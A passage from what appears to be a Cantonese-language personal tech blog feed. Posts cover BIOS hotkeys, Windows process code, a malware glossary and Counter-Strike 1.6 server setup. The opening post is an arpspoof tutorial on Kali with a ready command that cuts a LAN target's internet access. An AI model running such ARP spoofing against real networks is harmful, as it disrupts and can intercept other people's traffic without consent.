<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sudo apt-get install dsniff -y</span></span><br></pre></td></tr></table></figure>

<h2 id="發動功擊格式"><a href="#發動功擊格式" class="headerlink" title="發動功擊格式"></a>發動功擊格式</h2><p>然後以下呢條指令格式就係我地要進行功擊既格式指令。</p>
<ul>
<li>[interface name] : 睇返上面既 <code>iface</code>。</li>
<li>[Target IPV4 Address] : 睇返上面目標既 IP Address。</li>
<li>[Gateway IPV4 Address] : 睇返上面既 <code>Gataway</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># arpspoof -i [interface name] -t [Target IPV4 Address] [Gateway IPV4 Address]</span></span><br></pre></td></tr></table></figure>


<h3 id="示範功擊"><a href="#示範功擊" class="headerlink" title="示範功擊"></a>示範功擊</h3><p>當你見到以下圖片既畫面就代表已經功擊成功，他上不了網了，呵呵 A_A。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# arpspoof -i eth0 -t 192.168.0.108 192.168.0.1</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/ArpSpoof-commands/att.png" class="">

<p><strong><span style="font-size:larger;">目標電腦情況 (功擊中)</span></strong></p>
<p>他無論上什麼網站也只會載入幾秒鐘後再出現 <code>The connection has timed out</code>。</p>
<img src="/2021/12/11/ArpSpoof-commands/rap.png" class="">

<h3 id="停止功擊"><a href="#停止功擊" class="headerlink" title="停止功擊"></a>停止功擊</h3><p>當你想停止功擊既時候，你只需要將 Terminal 關閉，或者鍵盤按 <kbd>Ctrl</kbd>+<kbd>Z</kbd> 停止。</p>
<img src="/2021/12/11/ArpSpoof-commands/cz.png" class="">

<p><strong><span style="font-size:larger;">目標電腦情況 (已停止擊功)</span></strong></p>
<p>大概一分鐘內就會恢復網路。</p>
<img src="/2021/12/11/ArpSpoof-commands/ok.png" class="">

<h2 id="目標恢復網路"><a href="#目標恢復網路" class="headerlink" title="目標恢復網路"></a>目標恢復網路</h2><p>當功擊者仲功擊緊既時候，目標係唔會上到網，而當功擊者停止功擊既時候，目標係需要時候去恢復原本既網路速度。</p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Ethical hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>各款老母版 Boot Menu 快捷鍵</title>
    <url>/2022/01/15/BIOS-or-Boot-ment-Key/</url>
    <content><![CDATA[<h1 id="HotKeys"><a href="#HotKeys" class="headerlink" title="HotKeys"></a>HotKeys</h1><p>啟動菜單/BIOS 設置的熱鍵<br>您可以使用特殊鍵獲得引導菜單方式或 BIOS 設置。<br>以下是帶有相應熱鍵的 PC 品牌列表。 </p>
<ul>
<li>Acer: F2 或 DEL</li>
<li>ASUS: 所有個人電腦為 F2、主板為 F2 或 DEL</li>
<li>Dell: F2 或 F12</li>
<li>HP: ESC 或 F10</li>
<li>Lenovo: F2 或 Fn + F2</li>
<li>Lenovo (桌面電腦): F1</li>
<li>Lenovo (ThinkPads): Enter + F1.</li>
<li>MSI: 主板和個人電腦為 DEL</li>
<li>Microsoft Surface 平板電腦: 按住調高音量按鈕</li>
<li>Origin 個人電腦: F2</li>
<li>Samsung: F2</li>
<li>Sony: F1, F2, 或 F3</li>
<li>Toshiba: F2</li>
<li>GigaByte: Delete 或 F12</li>
</ul>
]]></content>
      <tags>
        <tag>BIOS</tag>
        <tag>Shortkeys</tag>
      </tags>
  </entry>
  <entry>
    <title>Visual Studio C++ - Kill Process by name</title>
    <url>/2022/01/31/CPP-Kill-Process-by-name/</url>
    <content><![CDATA[<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">killProcessByName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hSnapShot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPALL, <span class="literal">NULL</span>);</span><br><span class="line">	PROCESSENTRY32 pEntry;</span><br><span class="line">	pEntry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(pEntry);</span><br><span class="line">	BOOL hRes = <span class="built_in">Process32First</span>(hSnapShot, &amp;pEntry);</span><br><span class="line">	<span class="keyword">while</span> (hRes)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(pEntry.szExeFile, filename) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_TERMINATE, <span class="number">0</span>,</span><br><span class="line">				(DWORD)pEntry.th32ProcessID);</span><br><span class="line">			<span class="keyword">if</span> (hProcess != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				down++;</span><br><span class="line">				<span class="built_in">TerminateProcess</span>(hProcess, <span class="number">9</span>);</span><br><span class="line">				<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		hRes = <span class="built_in">Process32Next</span>(hSnapShot, &amp;pEntry);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hSnapShot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">killProcessByName</span>(<span class="string">&quot;Your Process Name Here.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Visual Studio .Net C# Windows Form - Find Process by name</title>
    <url>/2022/01/31/CSharp-Find-Process-by-name/</url>
    <content><![CDATA[<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 程式行緊</span></span><br><span class="line"><span class="keyword">if</span> (Process.GetProcessesByName(<span class="string">&quot;Process Stop&quot;</span>).Length &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do somethings</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 程式冇行緊</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (Process.GetProcessesByName(<span class="string">&quot;Process Start&quot;</span>).Length == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do somethings</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>Process</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome - 即時修改網頁文字 (表面)</title>
    <url>/2022/05/31/Chrome-javascript-edittext-content/</url>
    <content><![CDATA[<img src="cover.png" width="200px"/>

<h2 id="即時修改內容"><a href="#即時修改內容" class="headerlink" title="即時修改內容"></a>即時修改內容</h2><p>用 Bookmarks 加呢段野</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">javascript:<span class="built_in">document</span>.body.contentEditable = <span class="string">&#x27;true&#x27;</span>; <span class="built_in">document</span>.designMode=<span class="string">&#x27;on&#x27;</span>; <span class="keyword">void</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>電腦知識 - 病毒種類 (Malware)</title>
    <url>/2022/01/22/Computer-Malware-Type/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>「Malware」(惡意程式) 是 malicious software (惡意軟體) 的縮寫，<br>這個字指的是病毒、間諜軟體、蠕蟲，病毒、蠕蟲或特洛伊木馬程式。</p>
<h2 id="UDS-DangerousObject-Multi-Generic"><a href="#UDS-DangerousObject-Multi-Generic" class="headerlink" title="UDS:DangerousObject.Multi.Generic"></a>UDS:DangerousObject.Multi.Generic</h2><p>可能會在受感染的計算機上執行許多惡意活動。</p>
<h2 id="Trojan-Malware-300983-susgen"><a href="#Trojan-Malware-300983-susgen" class="headerlink" title="Trojan.Malware.300983.susgen"></a>Trojan.Malware.300983.susgen</h2><p>是一個有害的隱匿惡意軟件程序，可以偽裝成合法的OS process 並執行其有害任務，而不會被防毒軟體發現，<br>它們通常用於間諜軟體和勒索軟體。</p>
<h2 id="Trojans"><a href="#Trojans" class="headerlink" title="Trojans"></a>Trojans</h2><p>木馬（或特洛伊木馬）將自己偽裝成合法軟件，目的是誘騙您在計算機上執行惡意軟件。</p>
<h2 id="Spyware"><a href="#Spyware" class="headerlink" title="Spyware"></a>Spyware</h2><p>間諜軟件會侵入您的計算機並試圖竊取您的個人信息，例如信用卡或銀行信息、網絡瀏覽數據以及各種帳戶的密碼。</p>
<h2 id="Adware"><a href="#Adware" class="headerlink" title="Adware"></a>Adware</h2><p>廣告軟件是在您的屏幕上顯示廣告的垃圾軟件。廣告軟件會收集您的個人信息，以便為您提供更加個性化的廣告。</p>
<h2 id="Rootkits"><a href="#Rootkits" class="headerlink" title="Rootkits"></a>Rootkits</h2><p>Rootkit 使未經授權的用戶能夠在不被發現的情況下訪問您的計算機。</p>
<h2 id="Ransomware"><a href="#Ransomware" class="headerlink" title="Ransomware"></a>Ransomware</h2><p>勒索軟件旨在加密您的文件並阻止對它們的訪問，直到支付贖金。</p>
<h2 id="Worms"><a href="#Worms" class="headerlink" title="Worms"></a>Worms</h2><p>蠕蟲通過感染同一網絡上的其他計算機進行自我複制。它們旨在消耗帶寬和中斷網絡。</p>
<h2 id="Keyloggers"><a href="#Keyloggers" class="headerlink" title="Keyloggers"></a>Keyloggers</h2><p>鍵盤記錄器會跟踪您在鍵盤上的擊鍵並將它們記錄在日誌中。此信息用於未經授權訪問您的帳戶。 </p>
]]></content>
      <categories>
        <category>知識</category>
      </categories>
      <tags>
        <tag>Malware</tag>
      </tags>
  </entry>
  <entry>
    <title>ConvertZZ - 殘體字轉繁體字的工具</title>
    <url>/2022/01/11/ConvertZZ/</url>
    <content><![CDATA[<img src="ConvertZZ.svg" height="200" width="200"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>經常下載簡體文件的朋友們應該都有這個困擾吧，文件下載下來，常常看到的都是一堆亂碼<br>亂碼的原因是因為兩國的慣用編碼不同，簡體使用GBK，而繁體使用BIG5，當GBK的文字「直接」看做BIG5時，就會出現亂碼</p>
<p>一直以來，我慣用的簡繁轉換程式’ConvertZ’，但一直不太喜歡它的設計，為什麼上面總是要有一條Bar在那邊?為什麼開啟要等好幾秒?為什麼它有時候還會轉換失敗?為什麼作者好像都沒再更新了?<br>於是我開始計畫，意圖取代舊有的ConvertZ，改善這些問題。</p>
<p>由於是繼承自ConvertZ，因此取名ConvertZZ</p>
<h1 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h1><ul>
<li>仿造自ConvertZ，因此功能近似ConvertZ，修正ConvertZ的部分BUG</li>
<li>具有懸浮球，使用自定的手勢，使用各種快捷功能</li>
<li>漂亮的UI</li>
<li>ID3 tag轉換</li>
</ul>
<h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><ul>
<li><a href="https://github.com/flier268/ConvertZZ/releases" title="Release">Release</a></li>
</ul>
<h2 id="Wiki"><a href="#Wiki" class="headerlink" title="Wiki"></a>Wiki</h2><ul>
<li><a href="https://github.com/flier268/ConvertZZ/wiki">Github Wiki</a></li>
</ul>
<h2 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h2><ul>
<li>.Net 4.7.2以上</li>
</ul>
<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><ul>
<li><a href="https://github.com/flier268/ConvertZZ">Github</a></li>
</ul>
<h2 id="程式畫面"><a href="#程式畫面" class="headerlink" title="程式畫面"></a>程式畫面</h2><img src="/2022/01/11/ConvertZZ/hi.png" class="">
<img src="/2022/01/11/ConvertZZ/settings.png" class="">
<img src="/2022/01/11/ConvertZZ/right%20click.png" class="">]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter Strike 1.6 - AMX X Mod 升級至 1.9.0</title>
    <url>/2022/06/07/Counter-Strike-1-6-AMXX-Upgrade-to-1-9-0/</url>
    <content><![CDATA[<img src="cover.png">

<h1 id="為什麼沒有更新？"><a href="#為什麼沒有更新？" class="headerlink" title="為什麼沒有更新？"></a>為什麼沒有更新？</h1><p>因為 Counter-Strike 1.6 人數大不如以前，測試人數也越來越小，最隱定的版本是 1.8.2，AMXX 也很多年沒有更新了，然而 1.9.0 是一個開發者版本，一個不隱定的版本。</p>
<div class="note info flat">
    官方版本：</br>AMX Mod X uses rolling releases, and updates are continuous. Updates to stable versions of AMXX are small and non-disruptive. It is generally recommended to run the latest stable build, however, it is not necessarily urgent to upgrade when a newer build appears.
    These are unstable, development AMXX builds. For stable builds, see this page instead. For master branch builds, see this page.
    Note: Read the documentation! The "base" package is ONLY the base files. A Mod Addon pack is ONLY extra files. You should download the Base Package FIRST, and then download a Mod Addon pack for your mod if applicable.
</div>

<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><p>這裡假設是由原本的 1.8.2 版本上升至 1.9.0，如果你是直接使用 1.9.0的話就不用跟，就跟平時的一樣安裝就好，<br>不懂的人可以參考這篇文章：<a href="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/">Counter-Strike 1.6 - SteamCMD 建立伺服器並安裝 AMX X Mod (Windows)</a></p>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><p>下載兩個檔案 :</p>
<ul>
<li>Base Package</li>
<li>Counter-Strike</li>
</ul>
<p><a href="https://www.amxmodx.org/downloads-new.php">https://www.amxmodx.org/downloads-new.php</a></p>
<img src="/2022/06/07/Counter-Strike-1-6-AMXX-Upgrade-to-1-9-0/download.png" class="">

<h2 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h2><p>記得都是 Base 先解壓，再來就是 Counter-Strike 解壓，解壓後除了 <code>configs</code> 資料夾不用放，其他都放就升級成功了。</p>
<h2 id="檢查版本"><a href="#檢查版本" class="headerlink" title="檢查版本"></a>檢查版本</h2><p>於主控台輸入以下指令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">amxx version</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>AMX Mod X</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike 1.6 - 更改為 CS 模型</title>
    <url>/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本 CS1.6 既 Model 係用緊 CZ (見圖下)，<br>呢種既 Model 係大家認識既 CSO Model，<br>但其實佢係由 CZ 出黎既 Model (Counter-Strike: Condition Zero)，<br>呢隻 Model 我並唔鍾意用，<br>所以今日會講點樣改返做 CS1.6 既 Model。</p>
<img src="/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/CE.png" class="">

<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>我地需要開啟 CS1.6 既 Optinos，<br>然後再將撳 <code>Video</code>，<br>再將原本 Tick 左既 <code>Enable HD Models if available</code>，<br>Disable 左佢。</p>
<p>重開後就會見到唔見左 CE Model。</p>
<img src="/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/done.gif" class="">

<h1 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h1><p>搞掂。</p>
<img src="/2022/06/01/Counter-Strike-1-6-Change-CS-Default-Model/done.png" class="">]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>Games</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike 1.6 - 主控台指令說明</title>
    <url>/2022/06/07/Counter-Strike-1-6-Commands-line/</url>
    <content><![CDATA[<img src="/2022/06/07/Counter-Strike-1-6-Commands-line/cover.png" class="">

<h2 id="Counter-Strike-原生指令"><a href="#Counter-Strike-原生指令" class="headerlink" title="Counter-Strike 原生指令"></a>Counter-Strike 原生指令</h2><h3 id="FPS-顯示"><a href="#FPS-顯示" class="headerlink" title="FPS 顯示"></a>FPS 顯示</h3><ul>
<li>1 開</li>
<li>0 關</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cl_showfps 1</span><br></pre></td></tr></table></figure>

<h3 id="Bot-聊天關閉"><a href="#Bot-聊天關閉" class="headerlink" title="Bot 聊天關閉"></a>Bot 聊天關閉</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bot_chatter off</span><br></pre></td></tr></table></figure>

<p><a href="https://totalcsgo.com/command/botchatter">https://totalcsgo.com/command/botchatter</a></p>
<hr>
<h2 id="SYPB-Bot"><a href="#SYPB-Bot" class="headerlink" title="SYPB Bot"></a>SYPB Bot</h2><p><a href="https://ccnhsk-dev.blogspot.com/">https://ccnhsk-dev.blogspot.com/</a></p>
<h3 id="幫助"><a href="#幫助" class="headerlink" title="幫助"></a>幫助</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sypb help</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="CS-Bot-Enabler"><a href="#CS-Bot-Enabler" class="headerlink" title="CS Bot Enabler"></a>CS Bot Enabler</h2><p><a href="https://github.com/Arkshine/CSBotEnabler">https://github.com/Arkshine/CSBotEnabler</a></p>
<h3 id="加入電腦"><a href="#加入電腦" class="headerlink" title="加入電腦"></a>加入電腦</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bot_add</span><br></pre></td></tr></table></figure>

<h3 id="無線電聲音"><a href="#無線電聲音" class="headerlink" title="無線電聲音"></a>無線電聲音</h3><ul>
<li>1 開</li>
<li>0 關</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">csbot_precache_radio_sounds 0</span><br></pre></td></tr></table></figure>

<h3 id="幫助-1"><a href="#幫助-1" class="headerlink" title="幫助"></a>幫助</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cvarlist bot</span><br><span class="line">cmdlist bot</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>指令</tag>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>AMX Mod X</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike 1.6 - SteamCMD 建立伺服器並安裝 AMX X Mod (Windows)</title>
    <url>/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/</url>
    <content><![CDATA[<h1 id="SteamCMD"><a href="#SteamCMD" class="headerlink" title="SteamCMD"></a>SteamCMD</h1><p>Steam 控制台客戶端或 SteamCMD 是 Steam 客戶端的命令行版本，<br>它的主要用途是使用命令行界面安裝和更新 Steam 上可用的各種專用服務器，<br>它適用於使用 SteamPipe 內容系統的遊戲。<br>所有遊戲都已從已棄用的 HLDSUpdateTool 遷移到 SteamCMD。</p>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><p>首先到這網站下載 SteamCMD。</p>
<ul>
<li><a href="https://developer.valvesoftware.com/wiki/SteamCMD#Downloading_SteamCMD">https://developer.valvesoftware.com/wiki/SteamCMD#Downloading_SteamCMD</a></li>
</ul>
<p>案下 [1] 下載 <code>steamcmd.zip</code></p>
<p>或者你可以案 <a href="https://steamcdn-a.akamaihd.net/client/installer/steamcmd.zip">這裡</a></p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/steamcmd.png" class="">

<h2 id="解壓-SteamCMD"><a href="#解壓-SteamCMD" class="headerlink" title="解壓 SteamCMD"></a>解壓 SteamCMD</h2><p>將剛剛下載完的 steamcmd.zip 解壓後你會發現一個檔案名為 <code>steamcmd.exe</code>。</p>
<p>建立一個資料夾，再將檔案放到該資料夾(你不這樣做的話檔案會即時生產到目前目錄。)</p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/steamcmd.exe.png" class="">

<h2 id="SteamCMD-下載需要檔案"><a href="#SteamCMD-下載需要檔案" class="headerlink" title="SteamCMD 下載需要檔案"></a>SteamCMD 下載需要檔案</h2><p>開啟 <code>steamcmd.exe</code>，<br>開完之後只需等待他完成。</p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/downloading.gif" class="">


<h2 id="SteamCMD-指令操作"><a href="#SteamCMD-指令操作" class="headerlink" title="SteamCMD 指令操作"></a>SteamCMD 指令操作</h2><p>這裡需要兩個指令</p>
<h3 id="輸入-login-anonymous"><a href="#輸入-login-anonymous" class="headerlink" title="輸入 login anonymous"></a>輸入 <code>login anonymous</code></h3><img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/login%20anonymous.png" class="">

<h3 id="輸入-app-update-90-validate"><a href="#輸入-app-update-90-validate" class="headerlink" title="輸入 app_update 90 validate"></a>輸入 <code>app_update 90 validate</code></h3><ul>
<li>90 代表 Counter Strike 1.6</li>
</ul>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/app_update%20x1.png" class="">

<p>這裡會出現 Error，<br>但沒關係，<br>這是 steamcmd 問題，<br>我們只需再輸入一次就可以。</p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/app_update%20x2.png" class="">

<h2 id="測試開啟伺服器"><a href="#測試開啟伺服器" class="headerlink" title="測試開啟伺服器"></a>測試開啟伺服器</h2><p>完成以上的程式我們可以將 <code>steamcmd.exe</code> 關掉，<br>然後再嘗試開啟伺服器，<br>先到以下的路徑 <code>steamcmd\steamapps\common\Half-Life</code><br>開啟 <code>hlds.exe</code></p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/server-open-1.png" class="">

<p>再案啟動伺服器 …</p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/START-1.png" class="">

<p>然後我們開啟 CS 再輸入上面看到的 IP位置加入到伺服器列表</p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/add.png" class="">

<p>成功！</p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/done-1.png" class="">

<p>進入伺服器 …</p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/done-2.png" class="">

<p>完成。</p>
<p>但是現在伺服器是什麼也沒有，<br>現在我們開啟安裝 AMX Mod X，<br>到現有的伺服器。</p>
<h1 id="下載-AMXX-需要檔案"><a href="#下載-AMXX-需要檔案" class="headerlink" title="下載 AMXX 需要檔案"></a>下載 AMXX 需要檔案</h1><p>先到 AMX Mod X 官方網站。</p>
<p>我們需要下載三個檔案</p>
<p>記得有 Windows 版本就下載 Windows 版本。</p>
<ul>
<li><a href="https://www.amxmodx.org/release/amxmodx-1.8.2-cstrike-windows.zip">Counter-Strike Addon Windows</a></li>
<li><a href="https://www.amxmodx.org/release/amxmodx-1.8.2-base-windows.zip">AMX Mod X Base Winodws</a></li>
<li><a href="https://www.amxmodx.org/release/metamod-1.21.1-am.zip">Metamod</a></li>
</ul>
<p><a href="https://www.amxmodx.org/downloads.php">https://www.amxmodx.org/downloads.php</a></p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/amxx_d_1.png" class="">

<p>下載完成後你會發現到三個 zip 檔。</p>
<h2 id="解壓-base-再解壓-cstrike"><a href="#解壓-base-再解壓-cstrike" class="headerlink" title="解壓 base 再解壓 cstrike"></a>解壓 base 再解壓 cstrike</h2><p>這裡你需要留意次序。</p>
<p>注意 :<br>meta 的話 不用分開次序，<br>*** 然後請先將 base 解壓後再將 cstrike 解壓 ***</p>
<p>記得要用 cstrike replace base 的檔案。</p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/unzip-1.gif" class="">

<h2 id="解壓-Metamod-無分次序"><a href="#解壓-Metamod-無分次序" class="headerlink" title="解壓 Metamod (無分次序)"></a>解壓 Metamod (無分次序)</h2><img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/unzip-2.gif" class="">

<h2 id="將-addons-copy-去-cstrike-內"><a href="#將-addons-copy-去-cstrike-內" class="headerlink" title="將 addons copy 去 cstrike 內"></a>將 addons copy 去 cstrike 內</h2><p>完成後回到 <code>\steamcmd\steamapps\common\Half-Life\cstrike</code> 路徑，<br>將剛剛解壓完成的 <code>addons</code>，<br>整個放到 cstrike 內。</p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/copy-1.gif" class="">

<h3 id="建立-plugins-ini-檔案"><a href="#建立-plugins-ini-檔案" class="headerlink" title="建立 plugins.ini 檔案"></a>建立 plugins.ini 檔案</h3><p>進入到 <code>\Steam\steamapps\common\Half-Life\cstrike\addons\metamod</code>，<br>如果找不到一個檔案叫 <code>plugins.ini</code><br>那就新增一個檔案叫 <code>plugins.ini</code></p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/create-1.gif" class="">

<h3 id="新增-win32"><a href="#新增-win32" class="headerlink" title="新增 win32"></a>新增 win32</h3><p>再將剛剛新增的檔案，<br>在裡面打一行文字。</p>
<p>要跟 <code>Steam\steamapps\common\Half-Life\cstrike\addons\metamod\dlls</code> 內的 <code>metamod.dll</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win32 addons\amxmodx\dlls\amxmodx_mm.dll</span><br></pre></td></tr></table></figure>

<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/add-1.gif" class="">

<h2 id="修改-liblist-gam-檔案"><a href="#修改-liblist-gam-檔案" class="headerlink" title="修改 liblist.gam 檔案"></a>修改 liblist.gam 檔案</h2><p>進到 <code>Steam\steamapps\common\Half-Life\cstrike</code>，<br>找一個檔案叫 <code>liblist.gam</code><br>再將裡面第 14 行由原本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gamedll &quot;dlls\mp.dll&quot;</span><br></pre></td></tr></table></figure>

<p>改為</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gamedll &quot;addons\metamod\dlls\metamod.dll&quot;</span><br></pre></td></tr></table></figure>

<h3 id="完成-測試"><a href="#完成-測試" class="headerlink" title="完成 (測試)"></a>完成 (測試)</h3><p>完成以上就已經完成安裝 AMXX 了<br>開啟你的 Cs1.6，再開啟 <code>hlds.exe</code>，<br>然後進到你的伺服器看看有沒有反應 (AMXX，meta)。</p>
<p>進到伺服器我們分別打兩個指令 (hlds.exe 主控台輸入)<br><code>meta list</code></p>
<p>Result :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meta list</span><br><span class="line">Currently loaded plugins:</span><br><span class="line">      description      stat pend  file              vers      src  load  unlod</span><br><span class="line"> [ 1] AMX Mod X        RUN   -    amxmodx_mm.dll    v1.8.2    ini  Start ANY  </span><br><span class="line"> [ 2] Fun              RUN   -    fun_amxx.dll      v1.8.2    pl1  ANY   ANY  </span><br><span class="line"> [ 3] CStrike          RUN   -    cstrike_amxx.dll  v1.8.2    pl1  ANY   ANY  </span><br><span class="line"> [ 4] CSX              RUN   -    csx_amxx.dll      v1.8.2    pl1  ANY   ANY  </span><br><span class="line">4 plugins, 4 running</span><br></pre></td></tr></table></figure>

<p><code>amxx plugins</code></p>
<p>Result :</p>
